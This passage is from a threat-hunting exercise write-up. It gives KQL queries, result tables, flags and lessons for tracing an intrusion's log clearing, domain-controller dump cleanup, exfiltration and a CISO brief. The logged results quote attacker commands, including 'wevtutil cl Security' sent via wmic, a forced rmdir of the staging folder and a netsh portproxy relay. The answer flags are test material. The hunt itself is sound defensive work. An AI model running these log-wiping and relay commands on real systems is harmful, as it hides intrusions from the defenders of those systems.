let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "wevtutil"
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(InitiatingProcessFileName distinguishes direct execution from WMIC-delivered)*

| EventTime | DeviceName | InitiatingProcessFileName | ProcessCommandLine |
|---|---|---|---|
| 2026-02-23 11:01 | `WS-ENG04` | `cmd.exe` | `wevtutil  cl Security` |
| 2026-02-23 12:08 | `WS-ENG04` | `cmd.exe` | `wevtutil  cl Security` |
| 2026-02-28 03:33 | `SRV-FILES02` | `WmiPrvSE.exe` | `cmd.exe /c wevtutil cl Security` |
| 2026-02-28 03:47 | `WS-ENG04` | `cmd.exe` | `wmic  /node:"SRV-DC01" … wevtutil cl Security` |
| 2026-02-28 03:48 | `WS-ENG04` | `cmd.exe` | `wmic  /node:"SRV-FILES02" … wevtutil cl Security` |
| 2026-02-28 04:46 | `SRV-DC01` | `WmiPrvSE.exe` | `cmd.exe /c wevtutil cl Security` |

**Flag**
`WS-ENG04/SRV-DC01,SRV-FILES02`

</details>

<details>
<summary><strong>Q34 — Surviving Log Source · <code>Sysmon</code></strong></summary>

**Goal**
Identify which log source survived the attacker's log clearing activity.

**Approach**
The briefing explicitly lists the dataset's three data sources: "VPN // Sysmon // Security." The attacker ran `wevtutil cl Security` — which clears only the Windows Security event log channel. Sysmon writes to a completely separate channel (`Microsoft-Windows-Sysmon/Operational`) and was never targeted. All `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, and `DeviceRegistryEvents` throughout this hunt are sourced from Sysmon and continue to exist past the Feb 28 clearing, confirming Sysmon survived. The FortiGate VPN logs are appliance-side and also unaffected, but the question targets endpoint telemetry.

**Flag**
`Sysmon`

**Lesson**
> When queries don't surface a conceptual answer (log sources, collection agents, schema behaviour), go back to the briefing and data dictionary before writing more KQL. The briefing named all three data sources explicitly — the answer was there from the start.

</details>

<details>
<summary><strong>Q35 — Exfiltration Confidence Call · <code>HIGH</code></strong></summary>

**Goal**
State confidence level that exfiltration occurred and provide supporting justification.

**Approach**
Analytical judgment based on the complete evidence chain established across Q25–Q30. All three stages of exfiltration are confirmed by process telemetry with no gaps: the archive was created, encoded for transit, POSTed to an external attacker-controlled domain, and artifacts were immediately wiped. No single step is inferred — each is a logged command line.

Scope note: HIGH confidence covers the **A400M_NavSys** chain specifically. The NTDS dump (`ntds.dit`, `SYSTEM`, `SECURITY`) extracted on SRV-DC01 was not part of the March 2 POST and has no logged external egress (see Q36) — the most defensible mechanism is a remote SMB-read over the just-built portproxy relay (Q24), which would leave no FileEvent on the reading host.

**Flag**
`HIGH. The A400M_NavSys directory was compressed to win_update_kb5034.zip via Compress-Archive, base64-encoded with certutil to win_update_kb5034.b64, and POSTed via Invoke-WebRequest to cdn-telemetry.cloud-endpoint.net from WS-ENG04.`

</details>

<details>
<summary><strong>Q36 — DC Staging Cleanup · <code>cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs</code></strong></summary>

**Goal**
Identify the command used to delete the NTDS dump staging directory on `SRV-DC01`.

**Approach**
Swept `DeviceProcessEvents` on `SRV-DC01` for deletion commands targeting the `McAfee_Logs` staging path. The query returned the full lifecycle in one pass: `ntdsutil` creating the directory at 4:18 AM, followed by `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` at 4:45 AM — delivered via `WmiPrvSE.exe` (WMIC from `WS-ENG04`), double-logged by Sysmon.

The 27-minute window between dump creation and cleanup is the time the NTDS files were accessible on SRV-DC01 disk — but no `copy`, `xcopy`, `robocopy`, `move`, or `Copy-Item` command appears in that window, and `ntds.dit` / `SYSTEM` / `SECURITY` never land on `WS-ENG04` or `SRV-FILES02`. Notably, the SRV-DC01 portproxy relay was built *inside* this window (`netsh portproxy add … listenport=9999 connectaddress=10.1.36.210`, 04:23 AM — see Q24); the most defensible reading is that the attacker read the dump remotely over the just-built relay (SMB → into memory off-box, leaving no FileEvent on the reader) rather than staging it locally. The March 2 external POST (Q29) was the **A400M_NavSys** zip, not the NTDS dump — the NTDS dump's external egress is not directly evidenced.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine has_any ("rmdir","McAfee_Logs","McAfee","Temp\\McAfee")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(cleanup row appears twice — Sysmon double-log; delivered via WMIC from WS-ENG04)*

| EventTime | AccountName | ProcessCommandLine | InitiatingProcessFileName |
|---|---|---|---|
| 2026-02-28 04:45 | `m.richter` | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` | `WmiPrvSE.exe` |

**Flag**
`cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`

**Lesson**
> "Exfiltrated" is not a synonym for "extracted." Extraction (`ntdsutil IFM`, Q17/Q19) and local cleanup (this question) are both directly logged; the transfer between them is not. When persistence and exfil channels are built in the same window as the extraction itself (Q24's portproxy at 04:23 AM, inside the 04:18→04:45 dump-accessibility window), absence of a FileEvent on a receiving host is consistent with SMB-read-into-memory over the relay — not proof of exfil, but the most coherent explanation given the timing.

</details>

---

## Phase 08 — Closeout

<details>
<summary><strong>Q37 — CISO Brief</strong></summary>

**Goal**
Provide a concise executive summary of the full intrusion for CISO-level briefing.

**Approach**
Synthesis of all confirmed flags across Q01–Q36. No additional queries required — the complete intrusion chain is documented: initial access via compromised VPN credentials, beachhead establishment, lateral movement, credential theft, data exfiltration, persistence, and cleanup.

**Flag**
`s.brandt and m.richter were compromised. Attacker pivoted via WS-ENG04 beachhead to SRV-FILES02 and SRV-DC01. A400M_NavSys files exfiltrated to cdn-telemetry.cloud-endpoint.net via certutil-encoded POST. Persistence: netsh portproxy registry rules survive credential resets. Containment: delete portproxy entries and block C2 domain.`

</details>

